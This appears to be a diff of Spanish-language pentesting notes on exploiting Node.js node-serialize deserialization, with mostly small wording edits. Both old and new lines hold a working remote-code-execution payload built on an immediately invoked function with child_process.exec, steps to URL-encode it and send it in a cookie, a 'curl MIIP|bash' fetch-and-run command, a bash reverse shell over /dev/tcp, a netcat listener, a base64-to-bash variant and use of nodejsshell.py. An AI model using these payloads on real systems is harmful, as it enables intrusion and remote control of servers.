@@ -444,7 +444,7 @@ Recomendaría realizar la siguiente instalación;
 ```
 Te instala el node-serialize para poder serializar y deserializar en local lo que tu quieras, así haces pruebas antes en tu máquina.
 
-Al ejecutar; `node javaScriptObject`, siendo ese .js por ejemplo:
+Al ejecutar; `node javaScriptObject.js`, siendo ese .js por ejemplo:
 
 ``` js
 var y = {
@@ -467,21 +467,25 @@ Donde la data serializada, que tendrás que encodear posiblemente a urlencode, q
 ``` plaintext
 {"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',function(error, stdout, stderr) { console.log(stdout) });\n }()"}
 ```
-Lo más rápido es que te copies el payload de arriba y pongas el comando que quieras -quitale /n /t puede que de problemas y encodea a urlencode-. Otra manera de hacerlo, algo más larga, es serializar un .js -donde metas el comando que quieras- y el objeto serializado pasarlo por el input(una cookie por ejemplo) que te deserialize el servidor objetivo, recuerda el IIFE(los paréntesis).
+Lo más rápido es que te copies el payload de arriba y pongas el comando que quieras -quitale /n /t puede que de problemas y quita espacios, después encodea a urlencode-.
 
-Los **comandos a realizar** que haría son:  
-+ Primero un ping a mi máquina a ver si tengo rce.  
-+ Segundo y final un `curl MIIP|bash`. Compartiendo servidor con python por ejemplo y creando un index.html asi:
-``` html
+ Otra manera de hacerlo, algo más larga, es serializar un .js -donde metas el comando que quieras- y el objeto serializado pasarlo por el input(una cookie por ejemplo) que te deserialize el servidor objetivo, recuerda el IIFE(los paréntesis).
+
+Los **comandos a realizar** son:  
+Primero un ping a mi máquina a ver si tengo rce.  
+Segundo y final un `curl MIIP|bash`. Compartiendo servidor con python por ejemplo y creando un index.html asi:
+
+```
 #!/bin/bash
 
 bash -i >& /dev/tcp/MIIP/PUERTO 0>&1
 ```
-Me pongo en escucha por el puerto escogido `nc -nlvp PUERTO` y provoco la deserialización, por ejemplo metiendo el objeto serializado en la cookie y dando a actualizar.
+Me pongo en escucha por el puerto escogido `nc -nlvp PUERTO`. Para provocar la deserialización, en un ejemplo particular, podría meter el objeto serializado en la cookie y dar a actualizar.
 Otra forma si da problemas, sería hacer en tu máquina local un `cat index.html | base64 -w 0; echo` Y ya el comando en la data serializada que fuera;
 `echo “cadena enbase64”|base64 -d|bash`
 
-Otra manera de hacerlo contra un node.js (también sale en la página web puesta arriba de opsecx), es con la herramienta **nodejsshell.py** en github, me lo copio en formato raw por ejemplo y luego;  
+Otra manera de hacerlo contra un node.js (también sale en la página web puesta arriba de opsecx), es con la herramienta **nodejsshell.py** en github, me lo copio en formato raw por ejemplo y luego;
+
 ``` plaintext  
 > wget <direccion>  
 > python2 nodejsshell.py <MiIp> <Mipuerto>
